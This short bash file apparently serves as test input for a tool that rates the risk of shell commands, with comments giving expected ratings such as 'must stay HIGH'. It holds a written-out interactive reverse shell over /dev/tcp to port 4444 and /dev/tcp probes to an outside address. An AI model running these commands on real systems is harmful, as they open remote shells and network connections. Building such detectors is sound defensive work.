#!/bin/bash
# Interactive reverse shell to loopback must stay HIGH.
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# Bidirectional loopback with stdin duplicated onto the socket.
exec 3<>/dev/tcp/127.0.0.1/4444 0>&1

# exec probe to a non-loopback host.
exec 3<>/dev/tcp/203.0.113.5/9

# echo probe to a non-loopback host.
echo >/dev/tcp/203.0.113.5/9